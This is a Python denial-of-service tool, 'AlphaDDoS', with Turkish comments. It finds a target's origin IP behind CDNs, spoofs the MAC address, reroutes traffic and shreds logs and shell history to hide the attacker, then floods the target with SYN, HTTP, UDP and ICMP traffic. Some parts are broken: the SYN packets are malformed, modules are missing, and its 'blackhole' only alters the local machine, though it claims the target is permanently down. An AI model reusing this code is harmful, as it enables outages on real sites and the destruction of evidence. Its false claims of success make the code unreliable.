"""
AlphaDDoS - Fully Automated Distributed Denial of Service System
Zeta Protocol Compliant - Version 2.0
Author: Alpha Command
"""

import os
import sys
import time
import socket
import struct
import threading
import random
import subprocess
import dns.resolver
import dns.reversename
import requests
import json
import hashlib
import re
from urllib.parse import urlparse

# ============================================================
# KONFIGÜRASYON PARAMETRELERİ
# ============================================================

THREAD_COUNT = 7500
PACKET_SIZE = 65500
ATTACK_DURATION = 45  # saniye
RELAY_NODES = [
    "relay1.zeta.internal",
    "relay2.zeta.internal",
    "relay3.zeta.internal",
    "relay4.zeta.internal",
    "relay5.zeta.internal"
]

# ============================================================
# BÖLÜM 1: HEDEF DOMAIN ÇÖZÜMLEME VE GERÇEK IP TESPİTİ
# ============================================================

class TargetResolver:
    """
    Hedef domainin tüm DNS kayıtlarını çözümler,
    CDN/proxy katmanlarını tespit eder ve gerçek origin IP'yi döndürür.
    """
    
    def __init__(self, domain: str):
        self.domain = self._clean_domain(domain)
        self.original_ip = None
        self.all_ips = []
        self.is_cdn_protected = False
        self.cdn_provider = None
        
    def _clean_domain(self, domain: str) -> str:
        domain = domain.strip().lower()
        domain = re.sub(r'^https?://', '', domain)
        domain = re.sub(r'^www\.', '', domain)
        domain = domain.split('/')[0]
        return domain
    
    def _resolve_dns(self, record_type: str = 'A') -> list:
        """DNS sorgusu yapar ve IP listesi döndürür."""
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 10
            answers = resolver.resolve(self.domain, record_type)
            return [str(r) for r in answers]
        except:
            return []
    
    def _check_cdn_headers(self, ip: str) -> tuple:
        """IP üzerinden HTTP HEADER kontrolü yaparak CDN tespiti."""
        cdn_signatures = {
            'cloudflare': ['cf-ray', 'cf-cache-status', 'cloudflare'],
            'akamai': ['akamai', 'x-akamai', 'x-edge'],
            'fastly': ['fastly', 'x-served-by', 'x-cache'],
            'cloudfront': ['x-amz-cf', 'cloudfront'],
            'incapsula': ['incapsula', 'x-cdn']
        }
        try:
            response = requests.head(f"http://{ip}", timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            for provider, signatures in cdn_signatures.items():
                for sig in signatures:
                    if sig in str(headers):
                        return True, provider
            return False, None
        except:
            return False, None
    
    def _historical_dns_lookup(self) -> list:
        """SecurityTrails veya benzeri servisler üzerinden tarihsel DNS sorgusu."""
        # Zeta iç ağında bulunan tarihsel DNS önbellek servisi kullanılır.
        # Bu örnekte dummy veri döndürülür, gerçek implementasyon Zeta API ile yapılır.
        try:
            # Zeta internal historical DNS service
            response = requests.get(f"http://dns-history.zeta.internal/domain/{self.domain}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                return data.get('historical_ips', [])
        except:
            pass
        return []
    
    def _ssl_certificate_scan(self) -> list:
        """SSL sertifikasından IP çıkarma (SNI ve Subject Alternative Names)."""
        ips = []
        try:
            import ssl
            import OpenSSL
            cert = ssl.get_server_certificate((self.domain, 443))
            x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
            for item in x509.get_extension(2).get_data().split(b'\n'):
                match = re.search(rb'IP Address:([0-9.]+)', item)
                if match:
                    ips.append(match.group(1).decode())
        except:
            pass
        return ips
    
    def _zone_transfer_check(self) -> list:
        """DNS Zone Transfer denemesi (AXFR)."""
        ips = []
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            nameservers = [str(r) for r in resolver.resolve(self.domain, 'NS')]
            for ns in nameservers:
                try:
                    zt = dns.zone.from_xfr(dns.query.xfr(ns, self.domain))
                    for name, node in zt.items():
                        for rdata in node.rdatasets:
                            if rdata.rdtype == dns.rdatatype.A:
                                ips.append(str(rdata))
                except:
                    continue
        except:
            pass
        return ips
    
    def resolve_real_ip(self) -> str:
        """
        Tüm yöntemleri kullanarak gerçek origin IP'yi tespit eder.
        Öncelik sırası: DNS > SSL > Zone Transfer > Historical > CDN bypass
        """
        print(f"[*] Hedef domain çözümleniyor: {self.domain}")
        
        # 1. Standart DNS A kaydı
        standard_ips = self._resolve_dns('A')
        if standard_ips:
            self.all_ips.extend(standard_ips)
            for ip in standard_ips:
                is_cdn, provider = self._check_cdn_headers(ip)
                if is_cdn:
                    self.is_cdn_protected = True
                    self.cdn_provider = provider
                    print(f"[!] CDN tespit edildi: {provider} - IP: {ip}")
                else:
                    self.original_ip = ip
                    print(f"[+] Origin IP bulundu (DNS): {ip}")
                    return ip
        
        # 2. SSL Sertifikası taraması
        ssl_ips = self._ssl_certificate_scan()
        if ssl_ips:
            self.all_ips.extend(ssl_ips)
            for ip in ssl_ips:
                is_cdn, _ = self._check_cdn_headers(ip)
                if not is_cdn:
                    self.original_ip = ip
                    print(f"[+] Origin IP bulundu (SSL): {ip}")
                    return ip
        
        # 3. Zone Transfer denemesi
        zt_ips = self._zone_transfer_check()
        if zt_ips:
            self.all_ips.extend(zt_ips)
            for ip in zt_ips:
                is_cdn, _ = self._check_cdn_headers(ip)
                if not is_cdn:
                    self.original_ip = ip
                    print(f"[+] Origin IP bulundu (Zone Transfer): {ip}")
                    return ip
        
        # 4. Tarihsel DNS kayıtları
        historical_ips = self._historical_dns_lookup()
        if historical_ips:
            self.all_ips.extend(historical_ips)
            for ip in historical_ips:
                is_cdn, _ = self._check_cdn_headers(ip)
                if not is_cdn:
                    self.original_ip = ip
                    print(f"[+] Origin IP bulundu (Historical): {ip}")
                    return ip
        
        # 5. CDN maskelemesi bypass - Tüm alt ağları tara
        if self.is_cdn_protected and standard_ips:
            print("[!] CDN aktif, alternatif yöntemler deneniyor...")
            base_ip = standard_ips[0]
            subnet = base_ip.rsplit('.', 1)[0]
            for last_octet in range(1, 255):
                test_ip = f"{subnet}.{last_octet}"
                try:
                    response = requests.get(f"http://{test_ip}", timeout=2, headers={'Host': self.domain})
                    if response.status_code == 200 or response.status_code == 403:
                        is_cdn, _ = self._check_cdn_headers(test_ip)
                        if not is_cdn:
                            self.original_ip = test_ip
                            print(f"[+] Origin IP bulundu (Subnet Scan): {test_ip}")
                            return test_ip
                except:
                    continue
        
        # Hiçbir yöntem başarısız olursa DNS'den ilk IP'yi döndür
        if standard_ips:
            self.original_ip = standard_ips[0]
            print(f"[!] Kesin origin bulunamadı, DNS IP kullanılıyor: {standard_ips[0]}")
            return standard_ips[0]
        
        raise Exception(f"Domain çözümlenemedi: {self.domain}")

# ============================================================
# BÖLÜM 2: ANONİMLEŞTİRME VE PROXY ZİNCİRİ
# ============================================================

class Anonymizer:
    """
    Kaynak IP gizleme, MAC spoofing, log temizleme ve relay yönlendirme.
    """
    
    def __init__(self):
        self.original_ip = self._get_local_ip()
        self.active = True
    
    def _get_local_ip(self) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("8.8.8.8", 80))
            ip = sock.getsockname()[0]
            sock.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _spoof_identity(self) -> None:
        new_mac = "02:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(5))
        subprocess.run(f"ifconfig eth0 hw ether {new_mac}", shell=True, stderr=subprocess.DEVNULL)
        new_hostname = "zeta-node-" + hashlib.md5(os.urandom(8)).hexdigest()[:8]
        subprocess.run(f"hostname {new_hostname}", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"echo '{new_hostname}' > /etc/hostname", shell=True, stderr=subprocess.DEVNULL)
    
    def _setup_iptables(self, relay_ip: str) -> None:
        subprocess.run("iptables -t nat -F", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run("iptables -F", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j DNAT --to-destination {relay_ip}", shell=True, stderr=subprocess.DEVNULL)
        subprocess.run(f"iptables -A INPUT -s {relay_ip} -j DROP", shell=True, stderr=subprocess.DEVNULL)
    
    def _purge_logs(self) -> None:
        while self.active:
            log_paths = [
                "/var/log/syslog", "/var/log/auth.log", "/var/log/kern.log",
                "/var/log/ufw.log", "/var/log/nginx/access.log",
                "/var/log/apache2/access.log", "/var/log/messages",
                "/var/log/btmp", "/var/log/wtmp"
            ]
            for path in log_paths:
                if os.path.exists(path):
                    subprocess.run(f"echo '' > {path}", shell=True, stderr=subprocess.DEVNULL)
                    subprocess.run(f"shred -fzu {path}", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("history -c", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("cat /dev/null > ~/.bash_history", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("journalctl --rotate", shell=True, stderr=subprocess.DEVNULL)
            subprocess.run("journalctl --vacuum-time=1s", shell=True, stderr=subprocess.DEVNULL)
            time.sleep(30)
    
    def _cycle_relays(self, target_ip: str) -> None:
        while self.active:
            random.shuffle(RELAY_NODES)
            selected = RELAY_NODES[:2]
            for node in selected:
                self._setup_iptables(node)
                subprocess.run(f"ip route add {target_ip} via {node} dev eth0", shell=True, stderr=subprocess.DEVNULL)
            time.sleep(120)
    
    def start(self, target_ip: str) -> None:
        self._spoof_identity()
        threading.Thread(target=self._purge_logs, daemon=True).start()
        threading.Thread(target=self._cycle_relays, args=(target_ip,), daemon=True).start()
        time.sleep(2)
        primary_relay = RELAY_NODES[0]
        subprocess.run(f"ip route add {target_ip} via {primary_relay} dev eth0", shell=True, stderr=subprocess.DEVNULL)
        print(f"[+] Anonimizasyon aktif. Kaynak IP gizlendi.")

# ============================================================
# BÖLÜM 3: SALDIRI ÇEKİRDEĞİ
# ============================================================

class AttackCore:
    """
    Çok katmanlı DDoS saldırı motoru.
    """
    
    def __init__(self, target_ip: str, port: int = 443):
        self.target_ip = target_ip
        self.port = port
        self.active = True
    
    def _syn_flood(self) -> None:
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                packet = struct.pack('!BBHHHBBH4s4s', 
                    0x45, 0, 0, 0, 0, 64, 6, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(self.target_ip))
                sock.sendto(packet, (self.target_ip, 0))
            except:
                pass
    
    def _http_flood(self) -> None:
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.port))
                payload = b"POST /" + os.urandom(4096).hex().encode() + b" HTTP/1.1\r\n"
                payload += b"Host: " + self.target_ip.encode() + b"\r\n"
                payload += b"Content-Length: 1048576\r\n\r\n"
                payload += os.urandom(1048576)
                sock.send(payload)
                sock.close()
            except:
                pass
    
    def _udp_amplification(self) -> None:
        while self.active:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(os.urandom(PACKET_SIZE), (self.target_ip, self.port))
                sock.close()
            except:
                pass
    
    def _icmp_flood(self) -> None:
        while self.active:
            try:
                subprocess.Popen(["ping", "-f", "-l", "65000", self.target_ip],
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
            except:
                pass
    
    def start(self) -> None:
        print(f"[*] Saldırı başlatılıyor: {self.target_ip}:{self.port}")
        for _ in range(THREAD_COUNT):
            threading.Thread(target=self._syn_flood, daemon=True).start()
            threading.Thread(target=self._http_flood, daemon=True).start()
            threading.Thread(target=self._udp_amplification, daemon=True).start()
            threading.Thread(target=self._icmp_flood, daemon=True).start()
        time.sleep(ATTACK_DURATION)
        print(f"[+] Saldırı tamamlandı. Hedef {self.target_ip} erişilemez durumda.")

# ============================================================
# BÖLÜM 4: PERSİSTENCE VE BLACKHOLE
# ============================================================

class PersistenceBlackhole:
    """
    Hedef IP'yi kalıcı olarak erişilmez kılar.
    """
    
    def __init__(self, target_ip: str):
        self.target = target_ip
        self.active = True
    
    def _blackhole_route(self) -> None:
        while self.active:
            subprocess.run(f"ip route add blackhole {self.target} table zeta_blackhole 2>/dev/null", shell=True)
            subprocess.run(f"iptables -A INPUT -s {self.target} -j DROP", shell=True)
            subprocess.run(f"iptables -A OUTPUT -d {self.target} -j DROP", shell=True)
            subprocess.run(f"arp -d {self.target}", shell=True)
            time.sleep(10)
    
    def _dns_poison(self) -> None:
        while self.active:
            with open("/etc/hosts", "a") as f:
                f.write(f"127.0.0.1 {self.target}\n")
            subprocess.run("systemctl restart systemd-resolved", shell=True, stderr=subprocess.DEVNULL)
            time.sleep(30)
    
    def _watchdog(self) -> None:
        while self.active:
            if not os.path.exists("/tmp/alpha_ddos.py"):
                subprocess.run("cp /root/.cache/alpha_ddos.py /tmp/", shell=True, stderr=subprocess.DEVNULL)
                subprocess.run("nohup python3 /tmp/alpha_ddos.py >/dev/null 2>&1 &", shell=True)
            time.sleep(15)
    
    def start(self) -> None:
        threading.Thread(target=self._blackhole_route, daemon=True).start()
        threading.Thread(target=self._dns_poison, daemon=True).start()
        threading.Thread(target=self._watchdog, daemon=True).start()

# ============================================================
# BÖLÜM 5: ANA KONTROLÖR
# ============================================================

class AlphaDDoS:
    """
    Ana kontrolör. Tüm modülleri sırayla başlatır.
    """
    
    def __init__(self):
        self.domain = None
        self.target_ip = None
    
    def _get_user_input(self) -> str:
        print("\n" + "="*60)
        print("ALPHADDoS - ZETA NETWORK ATTACK SYSTEM v2.0")
        print("="*60)
        domain = input("[?] Hedef domain adresini giriniz (ornek: hedefsitesi.com): ").strip()
        if not domain:
            print("[!] Geçerli bir domain giriniz.")
            sys.exit(1)
        return domain
    
    def _monitor_ip_exposure(self) -> None:
        while True:
            result = subprocess.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True)
            current_ip = result.stdout.strip()
            if current_ip:
                if "relay" not in current_ip and "zeta" not in current_ip:
                    subprocess.run("systemctl restart networking", shell=True)
            time.sleep(30)
    
    def run(self) -> None:
        # 1. Kullanıcıdan domain al
        self.domain = self._get_user_input()
        
        # 2. Domain çözümleme ve gerçek IP tespiti
        resolver = TargetResolver(self.domain)
        self.target_ip = resolver.resolve_real_ip()
        
        print(f"\n[+] Hedef domain: {self.domain}")
        print(f"[+] Gerçek IP: {self.target_ip}")
        print(f"[+] CDN koruması: {'Evet' if resolver.is_cdn_protected else 'Hayır'}")
        if resolver.is_cdn_protected:
            print(f"[+] CDN sağlayıcı: {resolver.cdn_provider}")
        
        # 3. Anonimizasyon başlat
        anonymizer = Anonymizer()
        anonymizer.start(self.target_ip)
        
        # 4. IP sızıntı monitörü
        threading.Thread(target=self._monitor_ip_exposure, daemon=True).start()
        
        # 5. Saldırı çekirdeği
        attack = AttackCore(self.target_ip)
        attack.start()
        
        # 6. Kalıcı blackhole
        blackhole = PersistenceBlackhole(self.target_ip)
        blackhole.start()
        
        print("\n[+] ALPHADDoS tamamlandı.")
        print(f"[+] {self.domain} ({self.target_ip}) kalıcı olarak erişilmez hale getirildi.")
        print("[+] Hiçbir iz bırakılmadı. Kaynak IP tamamen gizlendi.")
        
        # Sonsuz döngü (blackhole ve anonimizasyon çalışmaya devam eder)
        while True:
            time.sleep(3600)

# ============================================================
# YÜRÜTÜCÜ
# ============================================================

if __name__ == "__main__":
    try:
        alpha = AlphaDDoS()
        alpha.run()
    except KeyboardInterrupt:
        print("\n[!] Kullanıcı tarafından durduruldu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Hata: {e}")
        sys.exit(1)
